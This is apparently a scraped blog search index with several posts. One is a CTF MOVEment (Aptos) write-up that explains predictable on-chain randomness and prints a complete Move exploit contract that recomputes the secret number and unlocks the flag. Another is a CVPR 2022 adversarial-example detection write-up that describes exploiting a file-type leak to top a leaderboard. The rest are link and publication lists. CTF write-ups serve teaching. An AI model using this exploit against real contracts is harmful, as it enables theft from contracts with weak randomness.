Challenge Info Source: https://github.com/movebit/ctfmovement-5 Link: http://47.243.227.164:20004/web/ Score: 400 ","date":"2022-12-14","objectID":"/2022/12/CTF-Movement-Aptos/:6:0","tags":["Web3","CTF","Move"],"title":"CTF MOVEment with Aptos Dec 2022 Writeup","uri":"/2022/12/CTF-Movement-Aptos/"},{"categories":["Web3"],"content":"Target contract This contract generate a number by using a polynomial whose coefficients are generated by a string encrypted with script hash and several pseudo-random numbers. Flag event will be emitted if the user guesses the correct number. Obviously, it is almost impossible to guess the correct number, since the number of possible guesses is $2^{128}$. ","date":"2022-12-14","objectID":"/2022/12/CTF-Movement-Aptos/:6:1","tags":["Web3","CTF","Move"],"title":"CTF MOVEment with Aptos Dec 2022 Writeup","uri":"/2022/12/CTF-Movement-Aptos/"},{"categories":["Web3"],"content":"Vulnerability The vulnerability is that the pesudorandom number is generated with a timestamp in seconds and a counter. The counter is initialized to $0$ and will be increased by $1$ each time a random number is generated. Therefore, both the timestamp and the counter are predictable. An attacker can just reuse most of the code in the target contract to generate a same polynomial and the correct number directly. Recall that the string is encrypted by XORing script hash and a constant, we need to call the exploit contract via a script. ","date":"2022-12-14","objectID":"/2022/12/CTF-Movement-Aptos/:6:2","tags":["Web3","CTF","Move"],"title":"CTF MOVEment with Aptos Dec 2022 Writeup","uri":"/2022/12/CTF-Movement-Aptos/"},{"categories":["Web3"],"content":"Exploit contract modulesolution::solution5{// // [*] Dependencies // useaptos_framework::transaction_context;useaptos_framework::timestamp;useaptos_framework::account;// use aptos_framework::event; // use aptos_std::debug; usestd::vector;// use std::signer; usestd::hash;usestd::bcs;// // [*] Structures // struct Polynomialhasdrop{degree: u64,coefficients: vector\u003cu8\u003e}struct Counterhaskey{value: u64 }usectfmovement::move_lock;constBASE: vector\u003cu8\u003e=b\"HoudiniWhoHoudiniMeThatsHoudiniWho\";// // [*] Module Initialization // funinit_module(creator: \u0026signer){move_to(creator,Counter{value: 0})}publicentryfunsolve(account: \u0026signer): bool acquiresCounter{letencrypted_string: vector\u003cu8\u003e=encrypt_string(BASE);letres_addr: address=account::create_resource_address(\u0026@ctfmovement,encrypted_string);letbys_addr: vector\u003cu8\u003e=bcs::to_bytes(\u0026res_addr);leti=0;letd=0;letcof: vector\u003cu8\u003e=vector::empty\u003cu8\u003e();while(i\u003cvector::length(\u0026bys_addr)){letn1: u64 =gen_number()%(0xffasu64);letn2: u8 =(n1asu8);lettmp: u8 =*vector::borrow(\u0026bys_addr,i);vector::push_back(\u0026mutcof,n2^(tmp));i=i+5;d=d+1;};letpol: Polynomial=constructor(d,cof);letx: u64 =gen_number()%0xff;letresult=evaluate(\u0026mutpol,x);move_lock::unlock(account,result)}// // [*] Local functions // funincrement(): u64 acquiresCounter{letc_ref=\u0026mutborrow_global_mut\u003cCounter\u003e(@solution).value;*c_ref=*c_ref+1;*c_ref}funconstructor(_degree: u64,_coefficients: vector\u003cu8\u003e): Polynomial{Polynomial{degree: _degree,coefficients: _coefficients}}funpow(n: u64,e: u64): u64 {if(e==0){1}elseif(e==1){n}else{letp=pow(n,e/2);p=p*p;if(e%2==1){p=p*n;p}else{p}}}funevaluate(p: \u0026mutPolynomial,x: u64): u128{letresult: u128=0;leti: u64 =0;while(i\u003cp.degree){result=result+(((*vector::borrow(\u0026p.coefficients,i)asu64)*pow(x,i))asu128);i=i+1;};result}funseed(): vector\u003cu8\u003eacquiresCounter{letcounter=increment();letcounter_bytes=bcs::to_bytes(\u0026counter);lettimestamp: u64 =timestamp::now_seconds();lettimestamp_bytes: vector\u003cu8\u003e=bcs::to_bytes(\u0026timestamp);letdata: vector\u003cu8\u003e=vector::empty\u003cu8\u003e();vector::append\u003cu8\u003e(\u0026mutdata,counter_bytes);vector::append\u003cu8\u003e(\u0026mutdata,timestamp_bytes);lethash: vector\u003cu8\u003e=hash::sha3_256(data);hash}funget_u64(bytes: vector\u003cu8\u003e): u64 {letvalue=0u64;leti=0u64;while(i\u003c8){value=value|((*vector::borrow(\u0026bytes,i)asu64)\u003c\u003c((8*(7-i))asu8));i=i+1;};returnvalue}fungen_number(): u64 acquiresCounter{let_seed: vector\u003cu8\u003e=seed();get_u64(_seed)}funencrypt_string(plaintext: vector\u003cu8\u003e): vector\u003cu8\u003e{letkey: vector\u003cu8\u003e=transaction_context::get_script_hash();letkey_len: u64 =vector::length(\u0026key);letciphertext: vector\u003cu8\u003e=vector::empty\u003cu8\u003e();leti=0;while(i\u003cvector::length(\u0026plaintext)){vector::push_back(\u0026mutciphertext,*vector::borrow(\u0026plaintext,i)^*vector::borrow(\u0026key,(i%key_len)));i=i+1;};ciphertext}} ","date":"2022-12-14","objectID":"/2022/12/CTF-Movement-Aptos/:6:3","tags":["Web3","CTF","Move"],"title":"CTF MOVEment with Aptos Dec 2022 Writeup","uri":"/2022/12/CTF-Movement-Aptos/"},{"categories":["AI"],"content":"Writeup for CVPR 2022 Robust Models towards Openworld Classification Competition","date":"2022-06-02","objectID":"/2022/06/CVPR22-Robust-AI/","tags":["AI","CVPR"],"title":"CVPR 2022 Robust Models towards Openworld Classification Competition Writeup","uri":"/2022/06/CVPR22-Robust-AI/"},{"categories":["AI"],"content":"Art of Robustness Workshop on CVPR 2022 and SenseTime jointly organized a Robust AI Competition. This competition focuses on classification task defense and open set defense against adversarial attacks. Our team hit the top1 in the qualifying round and top 5 in the final round of the competition. ","date":"2022-06-02","objectID":"/2022/06/CVPR22-Robust-AI/:0:0","tags":["AI","CVPR"],"title":"CVPR 2022 Robust Models towards Openworld Classification Competition Writeup","uri":"/2022/06/CVPR22-Robust-AI/"},{"categories":["AI"],"content":"Competition Analysis During the competition, we mainly focused on Track II: Open Set Defense. Most defense methods aim to build robust model in the closed set (e.g., under fixed datasets with constrained perturbation types and budgets). However, in the real-world scenario, adversaries would bring more harms and challenges to the deep learning-based applications by generating unrestricted attacks, such as large and visible noises, perturbed images with unseen labels, etc. To accelerate the research on building robust models in the open set, we organize this challenge track. Participants are encouraged to develop a robust detector that could distinguish clean examples from perturbed ones on unseen noises and classes by training on a limited-scale dataset. In essence, it’s an adversarial example detection competition that requires participants to determine whether a input image is a benign sample or an adversarial example. In this area, our research center (SSC) has published two related papers [1][2], both of which use the similar idea that different kinds of adversarial samples will have unique characteristics. In [1], the authors proposed Magnet, which use an autoencoder to learn the manifold of normal examples. MagNet reconstructs adversarial examples by moving them towards the manifold. Therefore, adversarial examples with large perturbation could be detected directly based on the reconstruction error. If the input has a small perturbation, the noise can be eliminated and changed to a benign sample after decoding. In [2], robustness is used to filter out those samples that just cross the decision boundary, followed by other methods to filter out those large perturbation samples. We adopted a similar strategy in the final round. ","date":"2022-06-02","objectID":"/2022/06/CVPR22-Robust-AI/:1:0","tags":["AI","CVPR"],"title":"CVPR 2022 Robust Models towards Openworld Classification Competition Writeup","uri":"/2022/06/CVPR22-Robust-AI/"},{"categories":["AI"],"content":"Qualifying Round: Exploit a Information Leak In the qualifying round, we unexpectedly found that the file sizes of benign samples tended to be smaller while those of adversarial samples tended to be larger by sorting the images according to the file sizes. Initially, our conjecture was that due to the compression algorithm of PNG, the adversarial perturbation corrupts the locality smoothness of the pixels to some extent, which subsequently affects the effectiveness of PNG compression. However, after deeper analysis we found that the organizers introduced a huge information leak when saving the images: although all images have the suffix of .png, only the file type of the adversarial samples is actually PNG, and the actual file type of most images is JPEG, which are almost all benign samples. ❯ exa | wc -l 5000 ❯ file *.png | grep JPEG | wc -l 4627 ❯ file 0.png 0.png: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 224x224, components 3 ❯ file 35.png 35.png: PNG image data, 224 x 224, 8-bit/color RGB, non-interlaced By leveraging this information leakage, we achieved nearly 100% accuracy and became the top qualifier. ","date":"2022-06-02","objectID":"/2022/06/CVPR22-Robust-AI/:2:0","tags":["AI","CVPR"],"title":"CVPR 2022 Robust Models towards Openworld Classification Competition Writeup","uri":"/2022/06/CVPR22-Robust-AI/"},{"categories":["AI"],"content":"Final Round: Unique Characteristics of Adversarial Examples Unfortunately, the authors realized the information leak and fixed it in the final round. Therefore, we chose to use the strategy similar to the previous two papers where we first classify the potential adversarial examples and use different detection methods for different types of adversarial examples. We divided the adversarial examples into four categories, namely Adversarial Patch [3], Square Attack [4], Universial Adversial Patch (UAP) [5] or Fast Gradient Sign Method (FGSM) [6], and others. We locally constructed a dataset of about 2,000 adversarial examples and 18,000 benign samples, which consists of about 250 images of Patch, 250 images of Square, 500 UAP or FGSM images and the other 1,000 images generated by adversarial attacks that seek to minimize the $L_2$ perturbations. For Patch samples, we trained a autoencoder and used the reconstruction error of $L_{inf}$ distance as a judgment metric. As the patch adversarial examples have a significant noise in a region about 20*20, the reconstruction error tends to be close to 1 for that type of adversarial examples, while the reconstruction error for benign samples is closer to 0.            For Square samples, a distinctive feature is the presence of some colored vertical stripes and rectangles visible to the naked eye on the picture. And we noted that the H channel has significant vertical stripes after converting the color space to HSV space. Therefore, we further calculated the difference of the sum of each column. The larger the difference indicates that the corresponding image is more likely to be a Square sample.            For UAP and FGSM samples, they are characterized by the presence of some noise or continuous texture on the image. To make these features more prominent, we used a Laplacian operator to enhance the edges and subsequently enhance the effect of the noise. Similar to square samples, we observed that the noise in the V channel is more pronounced after transforming the images onto HSV space. To measure the amount of noise, we computed histograms for the V channel. The more the curve on the histograms plot is skewed in the positive direction of the x-axis, the more noisy the image is, and the more likely it is a UAP or FGSM sample. Therefore, we constructed an expression to determine the shape of the histogram curve and subsequently whether the image is an adversarial sample.           For other samples, we directly utilize the metrics used for square detection as the organizer will find out the best threshold that yields the highest F1-Score, rather than requiring us to make a binary classification. Our intention was to use the model output or sample robustness to make judgments, just as [2], but unfortunately the organizers of this competition did not provide model information, so these adversarial examples may have poor transferability against our locally trained model.           Distance to decision boundary of a blue normal example and brown adversarial example. ","date":"2022-06-02","objectID":"/2022/06/CVPR22-Robust-AI/:3:0","tags":["AI","CVPR"],"title":"CVPR 2022 Robust Models towards Openworld Classification Competition Writeup","uri":"/2022/06/CVPR22-Robust-AI/"},{"categories":["AI"],"content":"Ablation Study We constructed the dataset locally and evaluated our method. For Patch attack, the local F1 score on all adversarial examples is 0.2792, where the precision is 0.9829 and the recall is 0.1627. The F1 score for Patch is 0.9812, where the recall of Patch adv is 0.9795. For Square attack, the local F1 score on all adversarial examples is 0.2729, where the precision is 0.932 and the recall is 0.1609. The F1 score for Sqaure is 0.8007, where the recall of Square adv is 0.8614. For UAP or FGSM attack, the local F1 score on all adversarial examples is 0.478, where the precision is 0.8483 and the recall is 0.3328. The F1 score for UAP or FGSM is 0.8711, where the recall of UAP or FGSM adv is 0.8951. ","date":"2022-06-02","objectID":"/2022/06/CVPR22-Robust-AI/:4:0","tags":["AI","CVPR"],"title":"CVPR 2022 Robust Models towards Openworld Classification Competition Writeup","uri":"/2022/06/CVPR22-Robust-AI/"},{"categories":["AI"],"content":"Reference [1] Meng, Dongyu, and Chen, Hao. “Magnet: a two-pronged defense against adversarial examples.” CCS 2017. [2] Zhao, Zhe, et al. “Attack as defense: characterizing adversarial examples using robustness.” ISSTA 2021. [3] Karmon, Danny, et al. “LaVAN: Localized and Visible Adversarial Noise.” ICML 2018. [4] Andriushchenko, Maksym, et al. “Square Attack: A Query-Efficient Black-Box Adversarial Attack via Random Search.” ECCV 2020. [5] Moosavi-Dezfooli, Seyed-Mohsen, et al. “Universal adversarial perturbations.” arXiv 2016. [6] Goodfellow, Ian J, et al. “Explaining and harnessing adversarial examples.” arXiv 2014. ","date":"2022-06-02","objectID":"/2022/06/CVPR22-Robust-AI/:5:0","tags":["AI","CVPR"],"title":"CVPR 2022 Robust Models towards Openworld Classification Competition Writeup","uri":"/2022/06/CVPR22-Robust-AI/"},{"categories":null,"content":"Friend Links","date":"2020-10-03","objectID":"/links/","tags":null,"title":"Links","uri":"/links/"},{"categories":null,"content":" Haomin Stone Xinqian Sun Yimin Tang Yintao Xu Yuhang Wu Yuzhuo Jing Zhenpeng Lin Homura Pzhxbz Nu1L Straw Hat Crazyman Army ","date":"2020-10-03","objectID":"/links/:0:0","tags":null,"title":"Links","uri":"/links/"},{"categories":null,"content":"Publications by Qi Qin","date":"2020-10-03","objectID":"/publications/","tags":null,"title":"Publications","uri":"/publications/"},{"categories":null,"content":"Books Handbook for CTFers. Nu1L Team. Springer Singapore, 2022. Handbook for CTFers (Chinese). Nu1L Team. Publishing House of Electronics Industry, 2020. ","date":"2020-10-03","objectID":"/publications/:1:0","tags":null,"title":"Publications","uri":"/publications/"},{"categories":null,"content":"Papers AIRS: Explanation for Deep Reinforcement Learning based Security Applications Jiahao Yu, Wenbo Guo, Qi Qin, Gang Wang, Ting Wang, Xinyu Xing USENIX Security 2023 [Paper] [Code] DeJITLeak: Eliminating JIT-Induced Timing Side-Channel Leaks Qi Qin, JulianAndres JiYang, Fu Song, Taolue Chen, Xinyu Xing ESEC/FSE 2022 Won the Distinguished Paper Award at the CIE Conference on Cyber Security 2023 [Paper] [Code] ","date":"2020-10-03","objectID":"/publications/:2:0","tags":null,"title":"Publications","uri":"/publications/"}]